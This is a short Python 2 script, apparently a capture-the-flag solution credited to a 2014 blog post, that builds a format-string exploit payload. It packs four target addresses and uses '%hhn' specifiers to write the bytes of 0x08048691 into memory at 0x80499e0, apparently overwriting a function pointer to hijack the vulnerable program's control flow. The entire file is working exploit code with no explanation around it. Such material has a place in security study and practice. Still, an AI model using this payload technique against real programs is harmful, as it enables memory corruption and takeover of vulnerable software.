# http://d.hatena.ne.jp/kusano_k/20140302/1393781714
import sys
import struct

# 08 04 86 91
T = [
	(0x80499e0, 0x91),
	(0x80499e1, 0x86),
	(0x80499e2, 0x04),
	(0x80499e3, 0x08),
]

offset = 4

code = "".join(struct.pack("<I",t[0]) for t in T)

n = len(code)
for i in range(len(T)):
    t = (T[i][1]-n-1)%256+1
    code += "%{0}c%{1}$hhn".format(t, offset+i)
    n += t

#print code
print repr(code)
